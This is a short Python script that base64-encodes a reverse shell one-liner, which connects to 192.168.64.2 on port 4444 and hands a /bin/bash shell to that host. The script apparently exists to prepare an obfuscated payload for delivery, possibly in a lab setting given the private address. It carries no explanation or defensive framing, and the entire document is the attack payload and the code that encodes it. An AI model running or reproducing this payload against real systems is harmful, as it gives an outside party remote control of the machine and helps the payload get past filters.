import base64

text = """START:python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.64.2",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'"""
encoded_bytes = base64.b64encode(text.encode("utf-8"))
encoded_str = encoded_bytes.decode("ascii")

print(encoded_str)